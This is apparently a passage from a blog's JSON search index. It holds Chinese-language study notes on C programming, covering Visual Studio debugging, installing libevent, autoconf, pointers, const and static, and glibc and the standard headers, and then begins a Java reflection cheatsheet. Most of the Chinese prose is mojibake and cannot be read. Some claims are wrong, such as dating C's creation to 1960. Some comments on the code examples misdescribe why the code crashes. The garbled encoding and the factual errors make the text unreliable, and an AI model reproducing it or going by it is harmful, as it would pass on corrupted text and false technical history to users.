itemã€‚åˆ›å»ºmain.c(ä»»æ„åå­—.céƒ½æ˜¯è¡Œçš„),ç„¶åå†™ä¸»å‡½æ•°ã€‚ è¿è¡Œçš„è¯ï¼Œç‚¹ä¸Šé¢çš„local windows debuggeræ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ä¼šä¸€é—ªè€Œè¿‡ã€‚æŒ‰ä¸‹ctrl +F5ï¼Œä¼šå‡ºç°consoleã€‚ visual studioä¸­æ–­ç‚¹çš„step intoæ˜¯f11ï¼Œstep out of æ˜¯shift + f11 .step overæ˜¯f10 evaluate expressionåœ¨å³ä¸‹è§’çš„immediate windowä¸­è¾“å…¥è¡¨è¾¾å¼å³å¯ visual studioä¸­debugçš„æ—¶å€™æœ‰æ—¶å€™ä¼šå‡ºç°Cannot find or open the PDB file [intelè¯´è¿™ç§äº‹ä¸æ˜¯error](https://software.intel.com/en-us/articles/visual-studio-debugger-cannot-find-or-open-the-pdb-file)ã€‚æ‰€ä»¥å°±ä¸è¦å»ç®¡å¥½äº†ã€‚ [Linuxä¸‹å®‰è£…ã€é…ç½®libevent](http://hahaya.github.io/build-libevent/) [ä½¿ç”¨libeventè¾“å‡ºHello](http://hahaya.github.io/hello-in-libevent/) &lt;del&gt;unixä¸‹å®‰è£…libeventçš„æ•™ç¨‹&lt;/del&gt; ç›´æ¥ sudo apt install libevent-devä¸€éƒ¨æå®š 1. åœ¨å®˜ç½‘ä¸Šä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„åŒ… 2. tar -zxvf /your path/libevent-1.4.14b-stable.tar.gzè§£å‹åˆ°å½“å‰ç›®å½• 3. cd libevent-1.4.14b-stable 4. ./configure 5. make &amp;&amp; make install (è¿™ä¸€æ®µä¼¼ä¹è¦rootæƒé™) 6. åœ¨/usr/local/libç›®å½•ä¸‹åº”è¯¥å¯ä»¥çœ‹è§å¤§é‡çš„åŠ¨æ€é“¾æ¥åº“äº†,è¿™æ—¶è¿è¡Œln -s /usr/local/lib/libevent-1.4.so.2 /usr/lib/libevent-1.4.so.2å‘½ä»¤(è¿™æ˜¯ä¸ºäº†é˜²æ­¢åœ¨ç³»ç»Ÿé»˜è®¤è·¯å¾„ä¸‹ æ‰¾ä¸åˆ°åº“æ–‡ä»¶,ä¹Ÿå¯ä»¥ä½¿ç”¨gccä¸­çš„-Lå‚æ•°æ¥æŒ‡å®šåº“æ–‡ä»¶çš„ä½ç½®æ‰€åœ¨) 7. æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨libeventåº“æ¥ç¼–å†™æˆ‘ä»¬çš„ä»£ç äº† macä¸ŠæŸ¥çœ‹æŸä¸ªlibraryæ˜¯å¦installäº†ï¼š &gt; ld -ljson-c ##çœ‹ä¸‹json-cè¿™ä¸ªlibraryæ˜¯å¦å·²ç»å®‰è£…äº† d: library not found for -ljson-c ##è¿™ç§å°±æ˜¯æ²¡æœ‰æ‰¾åˆ° ç…§è¯´ä¸€èˆ¬è¿™ç§libraryéƒ½æ˜¯è£…åœ¨/usr/lib æˆ– /usr/local/lib ä¸‹çš„ ls -al /usr/lib | grep libevent ls -al /usr/local/lib | grep libevent è¯•ä¸€ä¸‹å°±è¡Œäº† åœ¨ubuntuä¸Šï¼Œå®‰è£…çš„ä½ç½®æœ‰ç‚¹ä¸ä¸€æ · dpkg -L libevent-dev /usr/lib/x86_64-linux-gnu/libevent.a ### autoconfç­‰å·¥å…·çš„ä½¿ç”¨æ•™ç¨‹ ç»å¸¸ä¼šçœ‹åˆ°é¡¹ç›®é‡Œé¢çš„å®‰è£…æŒ‡å—åŒ…æ‹¬./configure make.. GNUçš„AUTOCONFå’ŒAUTOMAKE ./config &amp;&amp; make &amp;&amp; sudo make install || exit 1 æ¯”å¦‚è¯´awkçš„å®‰è£…è¿‡ç¨‹æ˜¯è¿™æ ·çš„ wget http://ftp.gnu.org/gnu/gawk/gawk-4.1.1.tar.xz tar xvf gawk-4.1.1.tar.xz cd gawk-4.1.1 &amp;&amp; ./configure make make check sudo make install å¦‚ä½•ç”Ÿæˆä¸€ä¸ªauto build file [auto build configure file](https://stackoverflow.com/questions/10999549/how-do-i-create-a-configure-script) autoconfå’Œautomakeçš„ä½¿ç”¨æ•™ç¨‹ ## 8. è¯­æ³• ### æŒ‡é’ˆ åœ¨Cè¯­è¨€ä¸­æ²¡æœ‰æ³›å‹ã€‚æ•…é‡‡ç”¨void æŒ‡é’ˆæ¥å®ç°æ³›å‹çš„æ•ˆæœã€‚ è¿™æ®µä¼šcore dumpçš„ ```c char *s1 = &quot;hello&quot;; ##è·å¾—äº†ä¸€ä¸ªæŒ‡å‘å­—ç¬¦ä¸²å¸¸é‡çš„æŒ‡é’ˆ *s1 = &#39;hey&#39;; ##ç¼–è¯‘æœŸä¼šè­¦å‘Šï¼šimplicit conversion from &#39;int&#39; to &#39;char&#39; changes value from 6841721 to 121 [-Wconstant-conversion]ã€‚è¿è¡ŒæœŸä¼šå‡ºç°ä¼š å‡ºç°[1] 5972 bus error ã€‚ æ”¹æˆs1 = &#39;hey&#39;; å°±å¥½äº† ##è¿™æ®µä¹Ÿä¼šcore dump char* s1 = &quot;hello&quot;; s1 += 1; printf(&quot;content %s\\n&quot;,*s1);##å´©åœ¨è¿™é‡Œï¼Œå› ä¸ºs1å…¶å®æ˜¯å¸¸é‡äº†ï¼Œè¿™é‡Œè¯»å–äº†æœªçŸ¥ä½ç½®çš„å†…å­˜ï¼Œå½“ç„¶å´© printf(&quot;content %s\\n&quot;,s1);##æ”¹æˆè¿™æ ·å°±å¥½äº† staticå…³é”®å­—cè¯­è¨€ä¸­ä¸åŒå¤´æ–‡ä»¶ä¸­çš„æ–¹æ³•åæˆ–è€…å¤–éƒ¨å˜é‡æ˜¯ä¸èƒ½é‡åçš„ï¼ˆæ‰€ä»¥ç»™æ–¹æ³•èµ·åå­—çš„æ—¶å€™è¦æ³¨æ„ä¸‹ï¼‰ï¼Œé™¤éä½¿ç”¨staticå…³é”®å­—ï¼ˆåªåœ¨è¯¥æºæ–‡ä»¶å†…å¯ä»¥ä½¿ç”¨ï¼‰ é™æ€å˜é‡å­˜æ”¾åœ¨å…¨å±€æ•°æ®åŒºï¼Œä¸æ˜¯åœ¨å †æ ˆä¸Šï¼Œæ‰€ä»¥ä¸å­˜åœ¨å †æ ˆæº¢å‡ºçš„é—®é¢˜ã€‚ç”Ÿå‘½å‘¨æœŸæ˜¯æ•´ä¸ªç¨‹åºçš„è¿è¡ŒæœŸã€‚ï¼ˆstaticå˜é‡åªåœ¨å½“å‰æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨ï¼Œä¸€æ—¦é€€å‡ºå½“å‰æ–‡ä»¶çš„è°ƒç”¨ï¼Œå°±ä¸å¯ç”¨ï¼Œä½†å¦‚æœè¿è¡ŒæœŸé—´åˆè°ƒç”¨äº†è¯¥æ–‡ä»¶ï¼Œé‚£ä¹ˆstaticå˜é‡çš„å€¼å°±ä¼šæ˜¯åˆšæ‰é€€å‡ºçš„æ—¶å€™çš„å€¼ï¼Œè€Œä¸æ˜¯defaultå€¼ï¼‰è®¾è®¡å’Œè°ƒç”¨è®¿é—®åŠ¨æ€å…¨å±€å˜é‡ã€é™æ€å…¨å±€å˜é‡ã€é™æ€å±€éƒ¨å˜é‡çš„å‡½æ•°æ—¶ï¼Œéœ€è¦è€ƒè™‘é‡åé—®é¢˜ã€‚å‡½æ•°åå†²çªçš„é—®é¢˜ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªstructå°èµ·æ¥cè¯­è¨€constå…³é”®å­—æœ‰çš„æ—¶å€™æ˜¯è¯´æŒ‡é’ˆæŒ‡å‘çš„å¯¹è±¡ä¸èƒ½åŠ¨ï¼Œæœ‰çš„æ—¶å€™è¯´çš„æ˜¯æŒ‡é’ˆæŒ‡å‘çš„å€¼ä¸èƒ½åŠ¨ å®preprocessorçš„å¥—è·¯ä¸€èˆ¬æ˜¯è¿™æ ·çš„awesomeFunction.h #ifndef AWESOME_FUNCTION #define AWESOME_FUNCTION ## å®é™…çš„å‡½æ•°å£°æ˜ #endif //AWESOME_FUNCTION å®å‡ºç°çš„ç¼˜ç”± c/c++æ˜¯ç¼–è¯‘è¯­è¨€ï¼Œåšä¸åˆ°â€œä¸€æ¬¡ç¼–è¯‘åˆ°å¤„è¿è¡Œâ€ï¼Œè¿™é‡Œçš„â€œåˆ°å¤„â€æŒ‡çš„æ˜¯ä¸åŒç¼–è¯‘å™¨æˆ–ä¸åŒç³»ç»Ÿå› ä¸ºç¨‹åºçš„å¤§å¤šæ•°åŠŸèƒ½éƒ½éœ€è¦è°ƒç”¨ç¼–è¯‘å™¨æä¾›çš„åº“å‡½æ•°ï¼Œä½¿ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„ç³»ç»Ÿèµ„æºå’ŒAPIç­‰ï¼Œè¿™äº›åœ¨ä¸åŒç¼–è¯‘å™¨æˆ–ä¸åŒç³»ç»Ÿä¸Šéƒ½æ˜¯ä¸åŒçš„æ‰€ä»¥ä¸€èˆ¬çš„æ–¹æ³•æ˜¯é€šè¿‡é¢„ç¼–è¯‘å®æ¥å¤„ç†è¿™ä¸€ç±»éœ€æ±‚ï¼Œåœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šä½¿ç”¨ä¸åŒçš„å®æ¥ç¼–è¯‘åŒä¸€ä¸ªæ–‡ä»¶é‡Œä¸åŒç‰ˆæœ¬çš„ä»£ç ï¼Œæ¥åšåˆ°â€œä¸€æ¬¡ç¼–å†™åˆ°å¤„ç¼–è¯‘â€ çœ‹åˆ°æœ‰äººåœ¨segmentfaultè¯´äº†è¿™æ ·ä¸€æ®µæ€»ç»“ï¼Œæ·±ä»¥ä¸ºç„¶ å¯¹äºç¼–ç¨‹è¯­è¨€ï¼ŒåŸºæœ¬ä¸Šæ˜¯è¿™æ ·è¿›åŒ–çš„ï¼š å…ˆç”¨æœºå™¨è¯­è¨€å†™å‡ºæ±‡ç¼–å™¨ï¼Œç„¶åå°±å¯ä»¥ç”¨æ±‡ç¼–è¯­è¨€ç¼–ç¨‹äº†ï¼Œç„¶åå†ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™æ±‡ç¼–å™¨ã€‚ å…ˆç”¨æ±‡ç¼–è¯­è¨€å†™å‡º C ç¼–è¯‘å™¨ï¼Œç„¶åå°±å¯ä»¥ç”¨ C è¯­è¨€ç¼–ç¨‹äº†ï¼Œç„¶åå†ç”¨ C è¯­è¨€æ¥å†™ C ç¼–è¯‘å™¨ã€‚ æœ‰äº† C ç¼–è¯‘å™¨ä¸ C è¯­è¨€ï¼Œå°±å¯ä»¥åœ¨è¿™ä¸ªåŸºç¡€ä¸Šå†ç¼–å†™é«˜çº§è¯­è¨€çš„ç¼–è¯‘å™¨æˆ–è§£é‡Šå™¨æˆ–è™šæ‹Ÿæœºäº†ã€‚ é C ç³»è¯­è¨€ï¼Œè¿›åŒ–è¿‡ç¨‹åŒä¸Šã€‚è‡³äºæ“ä½œç³»ç»Ÿï¼Œå…ˆç”¨æ±‡ç¼–è¯­è¨€å†™ä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚Ken Thompson å¹²è¿‡è¿™æ ·çš„äº‹ï¼Œä»–ç”¨æ±‡ç¼–è¯­è¨€ä»¥åŠä»–è‡ªåˆ›çš„ä¸€ç§è§£é‡Šæ€§è¯­è¨€â€”â€”B è¯­è¨€å†™å‡ºæ¥ unix ç¬¬ä¸€ç‰ˆï¼Œæ˜¯åœ¨ä¸€å°å†…å­˜åªæœ‰ 8KB çš„åºŸå¼ƒçš„è®¡ç®—æœºä¸Šå†™å‡ºæ¥çš„ã€‚ç„¶å Dennis Ritchie å‘æ˜äº† C è¯­è¨€ï¼Œç„¶å Ken ä¸ Dennis åˆç”¨ C è¯­è¨€åœ¨ä¸€å°æ›´å¥½çš„è®¡ç®—æœºâ€”â€”16 ä½æœºå™¨ä¸Šå°† unix é‡å†™äº†ä¸€éã€‚è‡³äº Windows ç³»ç»Ÿï¼ŒMS å…ˆæ˜¯ä¹°äº† QDOSï¼Œç„¶ååˆåœ¨ QDOS é‡Œå¼•å…¥äº†ä¸€äº› Unix çš„å…ƒç´ ï¼Œç„¶åæ¯”å°”Â·ç›–èŒ¨é ç€è¿™ä¸ªä¹°æ¥çš„ç³»ç»Ÿèµšäº†ä¸€å¤§ç¬”é’±ï¼Œç„¶åå°±åœ¨ DOS ç³»ç»Ÿä¸Šå¼€å‘äº† windows 3.1ï¼Œwindows 95 â€¦â€¦ syscallï¼ˆç³»ç»Ÿè°ƒç”¨ï¼‰å¾ˆå¤šé«˜çº§è¯­è¨€æ˜¯ç”¨cè¯­è¨€å†™çš„ï¼Œé‚£ä¹ˆcè¯­è¨€æ˜¯ç”¨ä»€ä¹ˆå†™çš„å‘¢ã€‚ç ”ç©¶äº†ä¸‹å†å²ï¼Œé¦–å…ˆä¸€é—¨é«˜çº§è¯­è¨€(cè¯­è¨€ç®—æ˜¯é«˜çº§è¯­è¨€)ä¸€èˆ¬éƒ½ä¼šæœ‰standardæˆ–è€…specificationï¼Œæ¯”å¦‚java çš„å«åšjsrXXX,pythonçš„å«åšpepxxxã€‚Cè¯­è¨€çš„è¯ç”Ÿ(1960å¹´)å…¶å®æ—©äºæ ‡å‡†(1989å¹´)ï¼Œå› ä¸ºä¸€å¼€å§‹æ²¡æœ‰æ ‡å‡†ï¼Œæ‰€ä»¥å„ç§å„æ ·çš„libraryéƒ½æœ‰ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åƒc++çš„stlé‚£æ ·çš„å®˜æ–¹æ ‡å‡†åº“ã€‚æ ¹æ®wikiçš„ä»‹ç»ï¼ŒANSI Cï¼Œå‡ ä¹è¢«æ‰€æœ‰å¹¿æ³›ä½¿ç”¨çš„Cè¯­è¨€ç¼–è¯‘å™¨æ”¯æŒçš„æ ‡å‡†ç›´åˆ°1989å¹´æ‰å½¢æˆï¼ˆä¹Ÿå°±æ˜¯C89ï¼‰ï¼Œåé¢åˆå‡ºç°äº†C90,C99ç­‰ï¼Œç°è¡Œçš„æ ‡å‡†æ˜¯C11ã€‚æ ‡å‡†å‡ºæ¥äº†(å…¶å®å°±æ˜¯stdio.hè¿™ç§å¤´æ–‡ä»¶)ã€‚Cè¯­è¨€è¿™è¾¹è¿˜ä¸å¤ªä¸€æ ·ï¼Œå¤´æ–‡ä»¶çš„å®ç°æ˜¯ç”±ç¼–è¯‘å™¨æä¾›çš„ï¼Œæ‰€ä»¥stdio.hå¯¹åº”çš„stdio.cæ–‡ä»¶å…¶å®ä¸å¥½æ‰¾ï¼Œå°±ç®—æ‰¾åˆ°äº†ï¼Œå„å®¶ç¼–è¯‘å™¨çš„å®ç°å¹¶ä¸ä¸€è‡´ï¼ˆå½“ç„¶éè¦æ‰¾çš„è¯ï¼Œå»glibcå®˜ç½‘ä¸‹è½½æºç è‡ªå·±çœ‹ä¹Ÿæ˜¯æœ‰çš„ï¼‰ æ”¯æŒANSI Cçš„ç¼–è¯‘å™¨åŒ…æ‹¬GCC, Xcode, Microsoft visual c++ç­‰ã€‚è¿™é‡Œåˆè¦æ‰¯åˆ°glibcå’Œlibcçš„å…³ç³»ï¼Œç²—ç•¥çš„è®¤ä¸ºlibcæ˜¯æ ‡å‡†ï¼Œglibcæ˜¯è¢«æœ€å¹¿æ³›é‡‡ç”¨çš„å®ç°ï¼ˆåœ¨Linuxä¸Šå°±æ˜¯lib/x86_64-linux-gnu/libc.so.6 è¿™ä¸ªæ–‡ä»¶ï¼‰ã€‚é™¤äº†glibcä»¥å¤–ï¼Œè¿˜æœ‰uclibc,dietlibc,BSD libcï¼Œappleä¹Ÿæœ‰è‡ªå·±çš„å®ç°å½“ç„¶éšç€æ ‡å‡†çš„è¿›æ­¥ï¼Œå¤´æ–‡ä»¶çš„æ•°é‡ä¹Ÿæ˜¯è¶Šæ¥è¶Šå¤šï¼Œæ¯”å¦‚ä¸€å¼€å§‹çš„C89åªæœ‰15ä¸ªå¤´æ–‡ä»¶ &lt;assert.h&gt; &lt;locale.h&gt; &lt;stddef.h&gt; &lt;ctype.h&gt; &lt;math.h&gt; &lt;stdio.h&gt; &lt;errno.h&gt; &lt;setjmp.h&gt; &lt;stdlib.h&gt; &lt;float.h&gt; &lt;signal.h&gt; &lt;string.h&gt; &lt;limits.h&gt; &lt;stdarg.h&gt; &lt;time.h&gt; c99åŠ äº†å‡ ä¸ª &lt;complex.h&gt; &lt;inttypes.h&gt; &lt;stdint.h&gt; &lt;tgmath.h&gt; &lt;fenv.h&gt; &lt;stdbool.h&gt; c11åˆåŠ äº†å‡ ä¸ª &lt;stdalign.h&gt; &lt;stdatomic.h&gt; &lt;stdnoreturn.h&gt; &lt;threads.h&gt; &lt;uchar.h&gt; æ³¨æ„ï¼ŒThree of the header files (complex.h, stdatomic.h, and threads.h) are conditional features that implementations are not required to support. æ‰€ä»¥ï¼Œæ¯”æ–¹è¯´å¤šçº¿ç¨‹è¿™ç§ç‰¹æ€§ï¼Œç¼–è¯‘å™¨å¹¶æ²¡æœ‰ä¹‰åŠ¡å»æ”¯æŒã€‚ å½“ç„¶ï¼Œåœ¨linuxç¯å¢ƒä¸‹ï¼Œè¿˜æœ‰unistd.hï¼ˆåŒ…å«ä¸€å¤§å †ç³»ç»Ÿè°ƒç”¨çš„wrapperï¼‰ï¼Œsignal.hç­‰å¤´æ–‡ä»¶ï¼Œè¿™æ˜¯å› ä¸ºposixä¹Ÿæäº†ä¸€å¥—C POSIX library,è¿™äº›æ˜¯posixæ ‡å‡†æ·»åŠ çš„å¤´æ–‡ä»¶ï¼Œå½“ç„¶ä¹Ÿåªåœ¨unixå¹³å°ä¸Šå­˜åœ¨ï¼Œè¿™äº›ä¸æ˜¯æ ‡å‡†ï¼Œä½†æ˜¯ä¼šç”¨åˆ°ã€‚æ‰€ä»¥åœ¨unixä¸Šå†™ç¨‹åºï¼Œé™¤äº†å¯ä»¥ä½¿ç”¨æ ‡å‡†åº“çš„å¤´æ–‡ä»¶ï¼Œè¿˜è¦ä½¿ç”¨posixæ ‡å‡†çš„å¤´æ–‡ä»¶ã€‚åœ¨linuxä¸Šï¼Œè¿™äº›æ–‡ä»¶ä¸€èˆ¬åœ¨/usr/includeæ–‡ä»¶å¤¹é‡Œã€‚ Cè¯­è¨€æ˜¯ç³»ç»Ÿè°ƒç”¨çš„ä¸€å±‚wrapper,è€Œç³»ç»Ÿè°ƒç”¨å®Œå…¨æ˜¯platform dependentçš„ã€‚ä»syccallä»¥åŠglibcçš„ç³»ç»Ÿè°ƒç”¨åŸç†å¯ä»¥çœ‹å‡ºï¼Œä¸€å¥ç®€å•çš„printfçš„å®ç°æ˜¯assembly codeã€‚glibcæºç åˆ†æä¸­ä»‹ç»åˆ°ï¼Œ glibcå®ç°äº†è®¸å¤šç³»ç»Ÿè°ƒç”¨çš„å°è£…ã€‚å®ƒä»¬çš„å°è£…æ–¹å¼å¤§è‡´å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šä¸€ è„šæœ¬ç”Ÿæˆæ±‡ç¼–æ–‡ä»¶ï¼Œæ±‡ç¼–æ–‡ä»¶ä¸­æ±‡ç¼–ä»£ç å°è£…äº†ç³»ç»Ÿè°ƒç”¨ã€‚è¿™ç§æ–¹å¼ï¼Œç®€ç§°è„šæœ¬å°è£…ã€‚äºŒ .cæ–‡ä»¶ä¸­è°ƒç”¨åµŒå…¥å¼æ±‡ç¼–ä»£ç å°è£…ç³»ç»Ÿè°ƒç”¨ã€‚ä¸€èˆ¬ä½¿ç”¨.cæ–‡ä»¶å°è£…ç³»ç»Ÿè°ƒç”¨ï¼Œä»£ç ä¸­é™¤äº†åµŒå…¥å¼æ±‡ç¼–å°è£…ä»£ç å¤–ï¼Œè¿˜æœ‰ä¸€äº›Cä»£ç åšå…¶ä»–å¤„ç†ã€‚è¿™ç§æ–¹å¼ï¼Œç®€ç§°.cå°è£…ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œä»openä¸fopençš„åŒºåˆ«æ¥çœ‹ï¼Œcè¯­è¨€æ ‡å‡†å®ç°äº†åœ¨ä¸åŒå¹³å°ä¸Šæä¾›ç»Ÿä¸€çš„fopenæ¥å£ï¼Œè€Œopenæ˜¯UNIXç³»ç»Ÿè°ƒç”¨å‡½æ•°ï¼ˆåŒ…æ‹¬LINUXç­‰ï¼‰ï¼Œè¿”å›çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼ˆFile Descriptorï¼‰ï¼Œå®ƒæ˜¯æ–‡ä»¶åœ¨æ–‡ä»¶æè¿°ç¬¦è¡¨é‡Œçš„ç´¢å¼•ã€‚fopenæ˜¯ANSI Cæ ‡å‡†ä¸­çš„Cè¯­è¨€åº“å‡½æ•°ï¼Œåœ¨ä¸åŒçš„ç³»ç»Ÿä¸­åº”è¯¥è°ƒç”¨ä¸åŒçš„å†…æ ¸apiã€‚è¿”å›çš„æ˜¯ä¸€ä¸ªæŒ‡å‘æ–‡ä»¶ç»“æ„çš„æŒ‡é’ˆã€‚åœ¨unixå¹³å°ä¸Šï¼Œfopençš„å†…éƒ¨å®ç°è°ƒç”¨äº†openã€‚è¦æ˜¯åœ¨windowsä¸Šï¼Œä½¿ç”¨çš„æ˜¯CreateFileçš„ç³»ç»Ÿapiã€‚ glibcçš„æºç åœ¨è¿™é‡Œ constå…³é”®å­—constå’ŒæŒ‡é’ˆä¸€èµ·ç”¨æ—¶ const int ptrï¼šè¡¨ç¤ºæŒ‡é’ˆæŒ‡å‘çš„æ•°æ®æ˜¯åªè¯»çš„ï¼Œä½†æ˜¯æŒ‡é’ˆæœ¬èº«å¯ä»¥æ”¹å˜æŒ‡å‘int const ptrï¼šåŒä¸Šint *const ptrï¼šè¡¨ç¤ºæŒ‡é’ˆæœ¬èº«æ˜¯åªè¯»çš„ï¼Œä½†æ˜¯æŒ‡é’ˆæŒ‡å‘çš„æ•°æ®æ˜¯å¯ä»¥è¯»å†™çš„ #include &lt;stdio.h&gt; #include &lt;string.h&gt; void strnchr(const char *str, char chr){ int count = 0; int len = strlen(str); for(int i=0; i&lt;len; i++){ if(str[i] == chr){ count++; } } printf(&quot;%d\\n&quot;, count); } int main(){ char str[] = &quot;abcdefg&quot;, chr = &#39;w&#39;; strnchr(str, chr); return 0; } ç”¨constä¿®é¥°å½¢å‚æŒ‡é’ˆçš„ä¸€ä¸ªé‡è¦çš„ç‚¹å°±æ˜¯å‘å¤–éƒ¨ä¿è¯ï¼ŒæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹æ˜¯åªè¯»çš„ã€‚ä¾‹å¦‚ä¸Šé¢çš„strnchrå‡½æ•°ï¼Œä½¿ç”¨constä¿®é¥°ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡é’ˆçš„æŒ‡å‘å¯ä»¥ä¿®æ”¹ï¼Œä½†æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²çš„å†…å®¹å°±ä¸ä¼šè¢«ä¿®æ”¹ã€‚ä½†æ˜¯è¿™é‡Œåªæ˜¯è¯´æŒ‡é’ˆAæŒ‡å‘çš„å†…å®¹ä¸èƒ½æ”¹äº†ï¼Œå‡å¦‚å°†æŒ‡é’ˆAçš„åœ°å€èµ‹ç»™B,é€šè¿‡Bè¿˜æ˜¯å¯èƒ½ä¿®æ”¹è¿™éƒ¨åˆ†å†…å®¹çš„ã€‚ ä¸€äº›è¯­æ³•æ€ªçš„å¾ˆvoid test(){ int err = 1; printf(&quot;go to first branch %d \\n&quot;,err); err: printf(&quot;go to this branch&quot;); // ä¼šèµ°åˆ°è¿™é‡Œ } cè¯­è¨€ä¸­çš„æœªå®šä¹‰è¡Œä¸º(æ¯”å¦‚è¯´æ•°ç»„è¶Šç•Œ)cè¯­è¨€çš„ä¸€äº›é—®é¢˜ #include &lt;stdio.h&gt; int main() { float a = 12.5; printf(&quot;%d\\n&quot;, a); printf(&quot;%d\\n&quot;, (int)a); printf(&quot;%d\\n&quot;, *(int *)&amp;a); return 0; } ä¸Šè¿°ä»£ç çš„è¾“å‡ºï¼Œåœ¨linuxä¸Šäº²æµ‹1615312664 // è¿™ä¸ªå˜æ¥å˜å»çš„ï¼Œ1973997256121095237632 åä¸¤ä¸ªå€¼éƒ½æ˜¯ç¡®å®šçš„ï¼Œç¬¬ä¸€ä¸ªå˜æ¥å˜å»çš„ï¼Œå…·ä½“ä¸ºä»€ä¹ˆå‡ºç°è¿™ä¸ªæ•°ï¼Œè¦è€ƒè™‘åˆ°å­—èŠ‚åº æœ€åCè¯­è¨€å°±æ˜¯è¿™æ ·ï¼Œå¥½å¤šåŠŸèƒ½éƒ½å¾—è‡ªå·±å®ç°ã€‚ä¸€äº›é«˜çº§è¯­è¨€éƒ½æœ‰è‡ªå·±çš„ç®€å•é«˜æ€§èƒ½çš„æ ‡å‡†åº“ï¼Œæ¯”å¦‚é›†åˆ,å¤šçº¿ç¨‹ç­‰ç­‰ã€‚Cè¯­è¨€å°±æ²¡æœ‰ï¼Œç”¨Cè¯­è¨€å†™çš„é¡¹ç›®ï¼Œéœ€è¦ç”¨åˆ°ä»»ä½•ç±»çš„åŠŸèƒ½çš„æ—¶å€™ï¼Œå‡ºäºæ€§èƒ½çš„è€ƒè™‘ï¼Œç›´æ¥å½“åœºé€ è½®å­ã€‚ c è¯­è¨€æœ‰å®ƒçš„è®¾è®¡å“²å­¦ï¼Œå°±æ˜¯é‚£è‘—åçš„â€œKeep It Simple, Stupidâ€ï¼Œè¯­è¨€æœ¬èº«ä»…ä»…å®ç°æœ€ä¸ºåŸºæœ¬çš„åŠŸèƒ½ï¼Œç„¶åæ ‡å‡†åº“ä¹Ÿä»…ä»…å¸¦æœ‰æœ€ä¸ºåŸºæœ¬çš„å†…å­˜ç®¡ç†ï¼ˆæ›´é«˜æ•ˆä¸€ç‚¹çš„å†…å­˜æ± éƒ½å¿…é¡»è¦è‡ªå·±å®ç°ï¼‰ã€IOã€æ–­è¨€ç­‰åŸºæœ¬åŠŸèƒ½ã€‚ ç¤¾åŒºæä¾›äº†ä¸€äº›æ¯”è¾ƒä¼˜ç§€çš„é€šç”¨åŠŸèƒ½åº“[1] http://developer.gnome.org/glib/stable/[2] http://www.gnu.org/software/gnulib/[3] http://apr.apache.org/ common opensource c libraries getsåœ¨c11ä¸­è¢«gets_sæ›¿ä»£ pthread_key_create, pthread_setspecific, pthread_getspecificè¿™ä¸‰ä¸ªæ˜¯cè¯­è¨€çš„apiï¼Œç±»ä¼¼äºjavaçš„threadLocalï¼Œè¯­è¨€éƒ½æ˜¯ç›¸é€šçš„ ==========================================tbd 3. gcc ,clang,llvmçš„å†å²cè¯­è¨€çš„goto fail æ·±å…¥selectå¤šè·¯å¤ç”¨å†…æ ¸æºç åŠ é©±åŠ¨å®ç° gccçš„command line arguments https://github.com/srdja/Collections-Chttps://github.com/gozfree/gear-libhttps://github.com/DaveGamble/cJSONhttps://github.com/EZLippi/WebBenchhttps://github.com/wolkykim/qlibc/blob/03a8ce0353/src/containers/qstack.chttps://github.com/larryhehttps://github.com/banu/tinyproxyhttps://github.com/aa65535/hev-dns-forwarderhttps://github.com/shadowsocks/shadowsocks-libev/blob/master/CMakeLists.txthttps://github.com/kozross/awesome-c#data-structures å‚è€ƒautomatic directory creation in makeæœ¬æ–‡çš„å‚è€ƒCPP/C++ Compiler Flags and Options gccå’Œclangçš„command line argumentsã€‚","tags":[{"name":"linux","slug":"linux","permalink":"https://haldir65.github.io/tags/linux/"},{"name":"C","slug":"C","permalink":"https://haldir65.github.io/tags/C/"}]},{"title":"pragmatic-java-chetsheet","date":"2018-07-05T23:05:52.000Z","path":"2018/07/05/2018-07-05-pragmatic-java-chetsheet/","text":"åå°„ å¦‚ä½•è·å¾—ä¸€ä¸ªclasså¯¹è±¡ Class class1 = null; Class class2 = null; Class class3 = null; try { class1 = Class.forName(&quot;com.example.test.javareflect.ReflectClass&quot;); // javaè¯­è¨€ä¸­ä»»ä½•ä¸€ä¸ªjavaå¯¹è±¡éƒ½æœ‰getClass æ–¹æ³• class2 = new ReflectClass().getClass(); //javaä¸­æ¯ä¸ªç±»å‹éƒ½æœ‰class å±æ€§ class3 = ReflectClass.class; // ç”±äºclassæ˜¯å•ä¾‹ï¼Œæ‰€ä»¥class1 == class2 == class3 } catch (ClassNotFoundException e) { e.printStackTrace(); } å¦‚ä½•æ£€æŸ¥ä¸€ä¸ªClassä¸­çš„æ‰€æœ‰constructor package com.me.reflection._001_basic; public class MyObject { public String name; public int age; public MyObject(String name) { this.name = name; } public MyObject(String name, int age) { this.name = name; this.age = age; } public MyObject(int age) { this.age = age; } public MyObject() { } } public void checkInitParams(){ Constructor&lt;?&gt; constructor[] = MyObject.class.getConstructors(); for (int i = 0; i &lt; constructor.length; i++) { // è¿è¡ŒæœŸè¿™ä¸ªlengthæ˜¯4ï¼Œå¦‚æœä¸Šé¢çš„Objectä¸­ä¸æ‰‹åŠ¨æ·»åŠ æ„é€ å‡½æ•°çš„è¯ï¼Œè¿™ä¸ªæ•°æ˜¯1 Class arrayClass[] = constructor[i].getParameterTypes(); System.out.print(&quot;cons[&quot; + i + &quot;] (&quot;); for (int j = 0; j &lt; arrayClass.length; j++) { if (j == arrayClass.length - 1) System.out.print(arrayClass[j].getName()); else System.out.print(arrayClass[j].getName() + &quot;, &quot;); } System.out.println(&quot;)&quot;); } } è¾“å‡º(æˆ‘æ€€ç–‘è¿™ä¸ªé¡ºåºæ˜¯æŒ‰ç…§å­—æ¯é¡ºåºæ¥çš„) cons[0] ()cons[1] (int)cons[2] (java.lang.String, int)cons[3] (java.lang.String) 